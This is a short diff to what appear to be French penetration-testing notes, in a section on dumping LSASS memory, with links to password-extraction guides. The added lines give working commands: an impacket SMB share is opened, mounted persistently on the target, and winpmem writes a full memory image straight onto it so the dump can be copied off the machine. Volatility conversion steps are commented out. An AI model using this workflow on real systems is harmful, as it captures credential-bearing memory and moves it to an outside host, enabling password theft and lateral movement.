@@ -377,8 +377,15 @@ LSASS DUMP
 https://redteamrecipe.com/50-methods-for-lsass-dumprtc0002
 https://diverto.github.io/2019/11/05/Extracting-Passwords-from-hiberfil-and-memdumps
 ```
+impacket-smbserver -smb2support monshare .
+net use Z: \\computer_name\monshare /PERSISTENT:YES
+winpmem_mini_x64.exe Z:mondmp.raw
+ou
 winpmem_mini_x64.exe mondmp.raw
-volatility_2.6_win64_standalone.exe -f .\mondmp.raw imageinfo
-volatility_2.6_win64_standalone.exe -f mondmp.raw --profile=Win10x64 raw2dmp -O mondmp.dmp
+copy mondmp.raw T:mondmp.raw
+net use T: /delete
+# volatility_2.6_win64_standalone.exe -f .\mondmp.raw imageinfo # Volatility 2.6 = version récente W10 pb
+# volatility_2.6_win64_standalone.exe -f mondmp.raw --profile=Win10x64 raw2dmp -O mondmp.dmp # Volatility 2.6 = version récente W10 pb
+
 
 ```
